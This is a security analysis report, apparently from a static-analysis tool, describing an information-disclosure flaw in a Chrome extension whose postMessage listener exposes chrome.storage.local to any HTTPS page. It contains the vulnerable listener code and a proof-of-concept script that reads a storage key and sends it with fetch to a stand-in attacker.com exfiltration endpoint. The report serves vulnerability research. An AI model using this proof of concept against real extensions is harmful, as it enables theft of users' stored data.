# CoCo Analysis: hhpnflehmikmmkneofkchgjgjbmmbalg

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: storage_local_get_source → window_postMessage_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/hhpnflehmikmmkneofkchgjgjbmmbalg/opgen_generated_files/cs_0.js
Line 418     var storage_local_get_source = {
        'key': 'value'
    };

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/hhpnflehmikmmkneofkchgjgjbmmbalg/opgen_generated_files/cs_0.js
Line 584                 resolve(result[key]);
    result[key]
```

**Code:**

```javascript
// Content script - Message listener (lines 607-628)
window.addEventListener('message', function (event) {
    if (event.source !== window || !event.data || event.data.source !== 'webpage') return;  // ← Attacker from webpage can trigger

    const { type, key, value, requestId } = event.data;  // ← Attacker-controlled data

    if (type === 'SET') {
        storageWrapper.setItem(key, value).then(() => {
            window.postMessage({ source: 'content_script', status: 'SET_SUCCESS', requestId }, '*');
        });
    } else if (type === 'GET') {
        storageWrapper.getItem(key).then(result => {  // ← Retrieve ANY storage key attacker specifies
            window.postMessage({ source: 'content_script', key: key, value: result, requestId }, '*');  // ← Send storage data back to attacker
        });
    }
});

// storageWrapper.getItem implementation (lines 581-586)
getItem: function (key) {
    return new Promise((resolve) => {
        chrome.storage.local.get([key], function (result) {
            resolve(result[key]);  // ← Storage data flows to postMessage
        });
    });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from any webpage

**Attack:**

```javascript
// Attacker code on any malicious webpage
// The extension content script runs on all HTTPS sites (manifest: "matches": ["https://*/*"])

// Request to read arbitrary storage key
const requestId = Math.random().toString();
window.postMessage({
    source: 'webpage',
    type: 'GET',
    key: 'sensitive_data',  // ← Can request any storage key
    requestId: requestId
}, '*');

// Listen for response with exfiltrated data
window.addEventListener('message', function(event) {
    if (event.data.source === 'content_script' && event.data.requestId === requestId) {
        console.log('Stolen storage data:', event.data.value);
        // Exfiltrate to attacker server
        fetch('https://attacker.com/exfil', {
            method: 'POST',
            body: JSON.stringify(event.data.value)
        });
    }
});
```

**Impact:** Information disclosure vulnerability. An attacker on any HTTPS website can read arbitrary data from the extension's chrome.storage.local by sending a postMessage with type='GET' and any key. The extension will retrieve the storage value and send it back via postMessage, allowing the attacker to exfiltrate sensitive user data stored by the extension. The attacker can also write arbitrary data to storage using type='SET', enabling storage poisoning attacks.

---
